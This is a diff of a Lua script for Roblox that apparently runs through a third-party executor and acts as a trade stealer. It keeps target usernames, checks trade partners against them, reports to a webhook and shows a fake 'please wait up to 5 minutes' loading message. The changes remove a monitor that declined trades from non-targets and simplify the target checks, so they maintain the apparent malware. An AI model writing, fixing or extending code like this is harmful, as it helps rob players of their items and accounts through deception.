@@ -9,7 +9,6 @@ local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local TeleportService = game:GetService("TeleportService")
 local RobloxReplicatedStorage = game:GetService("RobloxReplicatedStorage")
-local RunService = game:GetService("RunService")
 local plr = Players.LocalPlayer
 if not plr then return end
 
@@ -46,16 +45,11 @@ do
     end
 end
 
-if #USERNAMES == 0 then
-    warn("[AC] No targets")
-    return
-end
-
 if not WEBHOOK_ID or WEBHOOK_ID == "" then
     warn("[AC] Invalid webhook")
     return
 end
-if not USERNAMES or #USERNAMES == 0 then
+if #USERNAMES == 0 then
     warn("[AC] No targets")
     return
 end
@@ -431,18 +425,6 @@ end
 
 local function jitter()
     return 0.3 + (math.random() * 0.4)
-end
-
-local function aggressiveMonitor()
-    local status = getStatus()
-    if status == "ReceivingRequest" then
-        declineIncoming()
-    elseif status == "StartTrade" then
-        local partner = activePartner
-        if partner and not isTarget(partner) then
-            declineTrade()
-        end
-    end
 end
 
 local function checkTradePartner(data)
@@ -886,7 +868,6 @@ local function dispatchWebhook()
     return payload
 end
 
-
 local function deltaBypass()
     if not isDelta then return end
 
@@ -1001,10 +982,6 @@ local function main()
     print("[AC] Loading Script for", plr.Name)
     print("Please wait, this process can take up to 5 minutes depending on your connection and executor...")
     task.wait(3)
-
-    RunService.Heartbeat:Connect(function()
-        aggressiveMonitor()
-    end)
 
     task.spawn(function()
         while task.wait(2) do
